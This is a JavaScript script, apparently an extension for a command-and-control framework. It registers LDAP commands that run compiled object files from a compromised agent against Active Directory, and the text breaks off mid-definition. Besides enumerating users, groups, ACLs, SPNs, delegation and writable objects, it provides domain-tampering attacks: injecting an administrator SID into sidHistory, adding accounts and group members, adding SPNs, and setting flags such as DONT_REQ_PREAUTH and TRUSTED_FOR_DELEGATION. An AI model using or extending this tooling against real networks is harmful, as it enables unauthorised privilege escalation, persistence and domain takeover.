
// ============================================================================
// Helper function to determine if input is a username or a distinguished name
// ============================================================================
function identifyInputType(input) {
    const usernameRegex = /^[a-zA-Z0-9._-]{1,64}$/;
    const dnRegex = /^(?:[A-Z]+=[^,]+)(?:,(?:[A-Z]+=[^,]+))*$/i;
    if (dnRegex.test(input)) {
        return 1;
    } else if (usernameRegex.test(input)) {
        return 0;
    } else {
        return 0;
    }
}

// ============================================================================
// GET COMMANDS
// ============================================================================

var _cmd_getusers = ax.create_command(
    "get-users",
    "List all users in the domain",
    "ldap get-users -ou \"OU=Users,DC=domain,DC=local\" -dc dc01.domain.local -a description,mail"
);
_cmd_getusers.addArgFlagString("-ou", "ou_path", false, "OU path to search (optional)");
_cmd_getusers.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_getusers.addArgFlagString("-a", "attributes", false, "Comma-separated list of attributes to retrieve (always includes sAMAccountName)");
_cmd_getusers.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_getusers.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;
    let attributes = parsed_json["attributes"] || "";

    let bof_params = ax.bof_pack("cstr,cstr,int,cstr", [ou_path, dc_fqdn, use_ldaps, attributes]);
    let bof_path = ax.script_dir() + "_bin/LDAP/get-users." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Enumerating domain users...");
});



var _cmd_getcomputers = ax.create_command(
    "get-computers",
    "List all computers in the domain",
    "ldap get-computers -ou \"OU=Computers,DC=domain,DC=local\" -dc dc01.domain.local -a description,operatingSystem"
);
_cmd_getcomputers.addArgFlagString("-ou", "ou_path", false, "OU path to search (optional)");
_cmd_getcomputers.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_getcomputers.addArgFlagString("-a", "attributes", false, "Comma-separated list of attributes to retrieve (always includes sAMAccountName)");
_cmd_getcomputers.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_getcomputers.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;
    let attributes = parsed_json["attributes"] || "";

    let bof_params = ax.bof_pack("cstr,cstr,int,cstr", [ou_path, dc_fqdn, use_ldaps, attributes]);
    let bof_path = ax.script_dir() + "_bin/LDAP/get-computers." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Enumerating domain computers...");
});



var _cmd_getgroups = ax.create_command(
    "get-groups",
    "List all groups in the domain",
    "ldap get-groups -ou \"OU=Groups,DC=domain,DC=local\" -dc dc01.domain.local -a description,member"
);
_cmd_getgroups.addArgFlagString("-ou", "ou_path", false, "OU path to search (optional)");
_cmd_getgroups.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_getgroups.addArgFlagString("-a", "attributes", false, "Comma-separated list of attributes to retrieve (always includes sAMAccountName)");
_cmd_getgroups.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_getgroups.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;
    let attributes = parsed_json["attributes"] || "";

    let bof_params = ax.bof_pack("cstr,cstr,int,cstr", [ou_path, dc_fqdn, use_ldaps, attributes]);
    let bof_path = ax.script_dir() + "_bin/LDAP/get-groups." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Enumerating domain groups...");
});



var _cmd_getusergroups = ax.create_command(
    "get-usergroups",
    "List all groups a user is a member of",
    "ldap get-usergroups jane.doe -ou \"OU=Users,DC=domain,DC=local\" -dc dc01.domain.local"
);
_cmd_getusergroups.addArgString("user", true, "Username or DN");
_cmd_getusergroups.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_getusergroups.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_getusergroups.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_getusergroups.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let user = parsed_json["user"];
    let is_dn = identifyInputType(user);
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,int", [user, is_dn, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/get-usergroups." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Querying groups for ${user}...`);
});



var _cmd_getgroupmembers = ax.create_command(
    "get-groupmembers",
    "List all members of a group",
    "ldap get-groupmembers \"Domain Admins\" -ou \"OU=Groups,DC=domain,DC=local\" -dc dc01.domain.local"
);
_cmd_getgroupmembers.addArgString("group", true, "Group name or DN");
_cmd_getgroupmembers.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_getgroupmembers.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_getgroupmembers.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let group = parsed_json["group"];
    let is_dn = identifyInputType(group);
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr", [group, is_dn, ou_path, dc_fqdn]);
    let bof_path = ax.script_dir() + "_bin/LDAP/get-groupmembers." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Querying members of ${group}...`);
});



var _cmd_getobject = ax.create_command(
    "get-object",
    "Get all attributes of an object",
    "ldap get-object jane.doe -ou \"OU=Users,DC=domain,DC=local\" -dc dc01.domain.local"
);
_cmd_getobject.addArgString("target", true, "Object name or DN");
_cmd_getobject.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_getobject.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_getobject.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_getobject.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,int", [target, is_dn, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/get-object." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Querying object ${target}...`);
});



var _cmd_getdomaininfo = ax.create_command(
    "get-domaininfo",
    "Get domain information from rootDSE",
    "ldap get-domaininfo -dc dc01.domain.local"
);
_cmd_getdomaininfo.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_getdomaininfo.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_getdomaininfo.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int", [dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/get-domaininfo." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Querying domain information...");
});



var _cmd_getmaq = ax.create_command(
    "get-maq",
    "Get machine account quota (ms-DS-MachineAccountQuota)",
    "ldap get-maq -dc dc01.domain.local"
);
_cmd_getmaq.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_getmaq.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_getmaq.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int", [dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/get-maq." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Querying machine account quota...");
});



var _cmd_getwritable = ax.create_command(
    "get-writable",
    "Find objects you have write access to",
    "ldap get-writable -ou \"OU=Projects,DC=domain,DC=local\" -dc dc01.domain.local --detailed"
);
_cmd_getwritable.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_getwritable.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_getwritable.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_getwritable.addArgBool("--detailed", "Show detailed output");
_cmd_getwritable.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;
    let detailed = parsed_json["--detailed"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,cstr,int,int", [ou_path, dc_fqdn, use_ldaps, detailed]);
    let bof_path = ax.script_dir() + "_bin/LDAP/get-writable." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Finding writable objects...");
});



var _cmd_getdelegation = ax.create_command(
    "get-delegation",
    "Get delegation configuration for an object",
    "ldap get-delegation jane.doe -ou \"OU=Users,DC=domain,DC=local\" -dc dc01.domain.local"
);
_cmd_getdelegation.addArgString("target", true, "Object name or DN");
_cmd_getdelegation.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_getdelegation.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_getdelegation.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_getdelegation.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,int", [target, is_dn, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/get-delegation." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Querying delegation for ${target}...`);
});



var _cmd_getuac = ax.create_command(
    "get-uac",
    "Get UAC flags for an object",
    "ldap get-uac jane.doe -ou \"OU=Users,DC=domain,DC=local\" -dc dc01.domain.local"
);
_cmd_getuac.addArgString("target", true, "Object name or DN");
_cmd_getuac.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_getuac.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_getuac.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_getuac.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,int", [target, is_dn, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/get-uac." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Querying UAC for ${target}...`);
});



var _cmd_getattribute = ax.create_command(
    "get-attribute",
    "Get specific attribute values (comma-separated list supported)",
    "ldap get-attribute jane.doe objectSid,mail,description -ou \"OU=Users,DC=domain,DC=local\" -dc dc01.domain.local"
);
_cmd_getattribute.addArgString("target", true, "Object name or DN");
_cmd_getattribute.addArgString("attributes", true, "Comma-separated list of attribute names to retrieve (always includes sAMAccountName)");
_cmd_getattribute.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_getattribute.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_getattribute.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_getattribute.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let attributes = parsed_json["attributes"];
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,cstr,int", [target, is_dn, attributes, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/get-attribute." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Querying ${attributes} for ${target}...`);
});



var _cmd_getspn = ax.create_command(
    "get-spn",
    "Get SPNs for an object",
    "ldap get-spn machine01$ -ou \"OU=Computers,DC=domain,DC=local\" -dc dc01.domain.local"
);
_cmd_getspn.addArgString("target", true, "Object name or DN");
_cmd_getspn.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_getspn.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_getspn.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_getspn.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,int", [target, is_dn, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/get-spn." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Querying SPNs for ${target}...`);
});



var _cmd_getacl = ax.create_command(
    "get-acl",
    "Get ACL/security descriptor for an object",
    "ldap get-acl jane.doe -ou \"OU=Users,DC=domain,DC=local\" -dc dc01.domain.local --resolve"
);
_cmd_getacl.addArgString("target", true, "Object name or DN");
_cmd_getacl.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_getacl.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_getacl.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_getacl.addArgBool("--resolve", "Resolve SID names");
_cmd_getacl.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;
    let resolve = parsed_json["--resolve"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,int,int", [target, is_dn, ou_path, dc_fqdn, use_ldaps, resolve]);
    let bof_path = ax.script_dir() + "_bin/LDAP/get-acl." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Querying ACL for ${target}...`);
});



var _cmd_getrbcd = ax.create_command(
    "get-rbcd",
    "Get RBCD configuration for an object",
    "ldap get-rbcd somecomputer$ -ou \"OU=Computers,DC=domain,DC=local\" -dc dc01.domain.local"
);
_cmd_getrbcd.addArgString("target", true, "Object name or DN");
_cmd_getrbcd.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_getrbcd.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_getrbcd.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_getrbcd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,int", [target, is_dn, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/get-rbcd." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Querying RBCD for ${target}...`);
});



// ============================================================================
// ADD COMMANDS
// ============================================================================

var _cmd_adduser = ax.create_command(
    "add-user",
    "Add a user to the domain",
    "ldap add-user jane.doe 'P@ssw0rd!' -fn Jane -ln Doe -email jane.doe@domain.local -ou \"OU=Users,DC=domain,DC=local\" -dc dc01.domain.local"
);
_cmd_adduser.addArgString("username", true, "Username or DN");
_cmd_adduser.addArgString("password", true, "Password for the user");
_cmd_adduser.addArgFlagString("-fn", "firstname", false, "First name");
_cmd_adduser.addArgFlagString("-ln", "lastname", false, "Last name");
_cmd_adduser.addArgFlagString("-email", "email", false, "Email address");
_cmd_adduser.addArgBool("--disabled", "Create account disabled");
_cmd_adduser.addArgFlagString("-ou", "ou_path", false, "Target OU path");
_cmd_adduser.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_adduser.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_adduser.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let username = parsed_json["username"];
    let is_dn = identifyInputType(username);
    let password = parsed_json["password"];
    let firstname = parsed_json["firstname"] || "";
    let lastname = parsed_json["lastname"] || "";
    let email = parsed_json["email"] || "";
    let disabled = parsed_json["--disabled"] ? 1 : 0;
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = 1; // Always use LDAPS for password operations

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,cstr,cstr,int,cstr,cstr,int",
        [username, is_dn, password, firstname, lastname, email, disabled, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/add-user." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Adding user ${username}...`);
});


var _cmd_addcomputer = ax.create_command(
    "add-computer",
    "Add a computer to the domain",
    "ldap add-computer WORKSTATION01 -p 'P@ssw0rd!' -ou \"OU=Computers,DC=domain,DC=local\" -dc dc01.domain.local --ldaps"
);
_cmd_addcomputer.addArgString("computer", true, "Computer name or DN");
_cmd_addcomputer.addArgFlagString("-p", "password", false, "Password for the computer");
_cmd_addcomputer.addArgFlagString("-ou", "ou_path", false, "Target OU path");
_cmd_addcomputer.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_addcomputer.addArgBool("--disabled", "Create account disabled");
_cmd_addcomputer.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_addcomputer.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let computer = parsed_json["computer"];
    let is_dn = identifyInputType(computer);
    let password = parsed_json["password"] || "";
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let disabled = parsed_json["--disabled"] ? 1 : 0;
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;
    if (password) use_ldaps = 1;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,cstr,int,int",
        [computer, is_dn, password, ou_path, dc_fqdn, disabled, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/add-computer." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Adding computer ${computer}...`);
});



var _cmd_addgroup = ax.create_command(
    "add-group",
    "Add a group to the domain",
    "ldap add-group Stark -desc \"House Stark\" -scope global -ou \"OU=Groups,DC=domain,DC=local\" -dc dc01.domain.local"
);
_cmd_addgroup.addArgString("groupname", true, "Group name or DN");
_cmd_addgroup.addArgFlagString("-desc", "description", false, "Group description");
_cmd_addgroup.addArgFlagString("-type", "type", false, "Group type: security or distribution");
_cmd_addgroup.addArgFlagString("-scope", "scope", false, "Group scope: global, domainlocal, or universal");
_cmd_addgroup.addArgFlagString("-ou", "ou_path", false, "Target OU path");
_cmd_addgroup.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_addgroup.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_addgroup.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let groupname = parsed_json["groupname"];
    let is_dn = identifyInputType(groupname);
    let description = parsed_json["description"] || "";
    let type = parsed_json["type"] || "";
    let scope = parsed_json["scope"] || "";
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,cstr,cstr,cstr,int",
        [groupname, is_dn, description, type, scope, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/add-group." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Adding group ${groupname}...`);
});



var _cmd_addgroupmember = ax.create_command(
    "add-groupmember",
    "Add a member to a group",
    "ldap add-groupmember Stark jane.doe -ou \"OU=Groups,DC=domain,DC=local\" -dc dc01.domain.local"
);
_cmd_addgroupmember.addArgString("group", true, "Group name or DN");
_cmd_addgroupmember.addArgString("member", true, "Member name or DN");
_cmd_addgroupmember.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_addgroupmember.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_addgroupmember.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_addgroupmember.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let group = parsed_json["group"];
    let is_group_dn = identifyInputType(group);
    let member = parsed_json["member"];
    let is_member_dn = identifyInputType(member);
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,int,cstr,cstr,int",
        [group, is_group_dn, member, is_member_dn, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/add-groupmember." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Adding ${member} to ${group}...`);
});



var _cmd_addou = ax.create_command(
    "add-ou",
    "Add an organizational unit",
    "ldap add-ou 'OU=Research,DC=domain,DC=local' -desc \"Research OU\" -dc dc01.domain.local"
);
_cmd_addou.addArgString("ou_name", true, "OU name or DN");
_cmd_addou.addArgFlagString("-desc", "description", false, "OU description");
_cmd_addou.addArgFlagString("-parent", "parent_ou", false, "Parent OU DN");
_cmd_addou.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_addou.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_addou.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let ou_name = parsed_json["ou_name"];
    let is_dn = identifyInputType(ou_name);
    let description = parsed_json["description"] || "";
    let parent_ou = parsed_json["parent_ou"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,cstr,int",
        [ou_name, is_dn, description, parent_ou, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/add-ou." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Adding OU ${ou_name}...`);
});



var _cmd_addsidhistory = ax.create_command(
    "add-sidhistory",
    "Add a SID to an object's sidHistory attribute",
    "ldap add-sidhistory jane.doe S-1-5-21-123456789-123456789-123456789-500 -ou \"OU=Users,DC=domain,DC=local\" -dc dc01.domain.local"
);
_cmd_addsidhistory.addArgString("target", true, "Target object name or DN");
_cmd_addsidhistory.addArgString("sid_source", true, "SID string (S-1-5-...), username, or DN to copy SID from");
_cmd_addsidhistory.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_addsidhistory.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_addsidhistory.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_addsidhistory.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_target_dn = identifyInputType(target);
    let sid_source = parsed_json["sid_source"];
    let is_sid_source_dn = identifyInputType(sid_source);
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;
    let bof_params = ax.bof_pack("cstr,int,cstr,int,cstr,cstr,int",
        [target, is_target_dn, sid_source, is_sid_source_dn, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/add-sidhistory." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Adding SID to ${target}'s sidHistory...`);
});



var _cmd_addspn = ax.create_command(
    "add-spn",
    "Add an SPN to a object",
    "ldap add-spn machine01 HOST/machine01.domain.local -ou \"OU=Computers,DC=domain,DC=local\" -dc dc01.domain.local"
);
_cmd_addspn.addArgString("target", true, "Object name or DN");
_cmd_addspn.addArgString("spn", true, "SPN to add");
_cmd_addspn.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_addspn.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_addspn.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_addspn.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let spn = parsed_json["spn"];
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,cstr,int", [target, is_dn, spn, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/add-spn." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Adding SPN ${spn} to ${target}...`);
});



var _cmd_addattribute = ax.create_command(
    "add-attribute",
    "Add a value to an attribute",
    "ldap add-attribute jane.doe description 'File not found' -ou \"OU=Users,DC=domain,DC=local\" -dc dc01.domain.local"
);
_cmd_addattribute.addArgString("target", true, "Object name or DN");
_cmd_addattribute.addArgString("attribute", true, "Attribute name");
_cmd_addattribute.addArgString("value", true, "Value to add");
_cmd_addattribute.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_addattribute.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_addattribute.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_addattribute.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let attribute = parsed_json["attribute"];
    let value = parsed_json["value"];
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,cstr,cstr,int",
        [target, is_dn, attribute, value, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/add-attribute." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Adding ${attribute} value to ${target}...`);
});



var _cmd_adduac = ax.create_command(
    "add-uac",
    "Add UAC flags to an object",
    "ldap add-uac jane.doe TRUSTED_FOR_DELEGATION -ou \"OU=Users,DC=domain,DC=local\" -dc dc01.domain.local"
);
_cmd_adduac.addArgString("target", true, "Object name or DN");
_cmd_adduac.addArgString("flags", true, "Comma-separated UAC flags (e.g., DONT_REQ_PREAUTH,DONT_EXPIRE_PASSWD)");
_cmd_adduac.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_adduac.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_adduac.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_adduac.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let flags = parsed_json["flags"];
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,cstr,int", [target, is_dn, flags, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/add-uac." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Adding UAC flags to ${target}...`);
});



var _cmd_adddelegation = ax.create_command(
    "add-delegation",
    "Add a delegation SPN to an object",
